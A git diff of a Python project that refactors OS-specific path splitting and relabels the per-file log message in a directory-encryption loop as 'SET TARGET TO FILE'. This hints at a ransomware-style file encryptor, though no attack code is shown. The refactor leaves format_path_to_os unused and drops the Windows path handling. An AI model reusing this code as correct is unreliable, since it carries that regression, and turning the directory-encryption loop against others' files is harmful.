@@ -29,20 +29,23 @@ def get_convert_str_to_path_list(path):
     return res
 
 
+def split_path_for_os(path):
+    if platform == OperationSystem.LINUX:
+        return path.split('/')
+    else:
+        return path.split('\\')
+
+
+def format_path_to_os(path):
+    if platform == OperationSystem.LINUX:
+        return path
+    else:
+        return path[1:]
+
+
 def get_my_directory(path=__file__):
-    os_name = platform
-
-    if os_name == OperationSystem.LINUX:
-        path = path.split('/')
-    else:
-        path = path.split('\\')
-
-    res = get_convert_str_to_path_list(path)
-
-    if os_name == OperationSystem.LINUX:
-        return res
-    else:
-        return res[1:]
+    path = split_path_for_os(path)
+    return get_convert_str_to_path_list(path)
 
 
 class DirectoryReader:
@@ -124,7 +127,7 @@ def crypt_directory(directory: DirectoryReader):
     c = crypt.Crypt()
 
     for name_file, file in directory.get_files():
-        print(name_file, file)
+        print(f'<KHORN> SET TARGET TO FILE: {name_file}')
         res[name_file] = ''
 
         try:
